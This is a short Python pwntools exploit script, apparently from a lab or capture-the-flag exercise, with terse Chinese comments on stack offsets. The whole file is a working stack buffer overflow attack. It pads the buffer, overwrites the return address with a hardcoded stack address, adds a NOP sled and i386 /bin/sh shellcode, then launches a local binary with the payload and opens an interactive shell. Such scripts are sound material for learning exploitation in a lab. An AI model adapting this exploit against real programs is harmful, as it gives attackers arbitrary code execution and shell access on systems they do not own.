from pwn import *

ret_addr = 0xffffd044             # ebp=0xffffd028 结合下面的payload  24A 4ret_address 20个nop 后面就是44shellcode rsp变为rbp的值 然后pop ebp  pop eip 就是8
shellcode = shellcraft.i386.sh()

payload = b"A"*24
payload+=p32(ret_addr)
payload+=b"\x90"*20
print(len(asm(shellcode))) #44 
payload +=asm(shellcode)
payload+=b"C"*169

p = process(['../target/a.out',payload])
p.interactive()

